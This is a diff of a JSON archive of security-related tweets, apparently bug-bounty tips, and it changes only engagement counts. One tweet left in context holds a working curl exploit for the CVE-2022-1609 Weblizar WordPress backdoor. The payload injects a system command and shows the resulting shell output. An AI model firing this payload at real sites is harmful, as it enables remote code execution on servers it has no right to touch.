@@ -198,7 +198,7 @@
     "tweetfavorites": 823,
     "tweetquotes": 5,
     "tweetreplies": 13,
-    "tweetretweets": 272,
+    "tweetretweets": 271,
     "tweettext": "CVE-2022-1609 WordPress Weblizar  Backdoor\n\n$ curl -s -d 'blowfish=1' -d \"blowf=system('id');\" 'http://localhost:8888/wp-json/am-member/license'\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n#bugbounty #bugbountytips #nday",
     "tweettime": "2022-05-26, 05:21:05",
     "tweeturl": "https://twitter.com/momika233/status/1529694086193508353",
@@ -871,7 +871,7 @@
     "username": "Horizon3Attack"
 }
 {
-    "tweetfavorites": 498,
+    "tweetfavorites": 499,
     "tweetquotes": 1,
     "tweetreplies": 5,
     "tweetretweets": 132,
